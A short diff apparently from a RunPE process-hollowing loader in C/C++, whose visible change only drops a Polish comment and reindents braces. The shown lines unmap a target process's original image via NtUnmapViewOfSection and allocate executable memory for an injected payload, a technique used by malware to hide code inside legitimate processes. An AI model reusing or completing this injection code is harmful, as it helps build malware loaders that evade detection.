@@ -115,12 +115,11 @@ void RunPE(char* host_pe, char* inject_pe)
         HMODULE h_ntdll = GetModuleHandleA("ntdll.dll");
         FARPROC NtUnmapViewOfSection = GetProcAddress(h_ntdll, "NtUnmapViewOfSection");
 
-        // odmapuj oryginalny moduł
         if ((*(NTSTATUS(*)(HANDLE, PVOID)) NtUnmapViewOfSection)(
 			proc_info.hProcess, original_img_base))
-		{
+	{
             return;
-		}
+	}
     }
 
     LPVOID allocated_base = VirtualAllocEx(proc_info.hProcess, (LPVOID)prefer_base, payload_size, (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
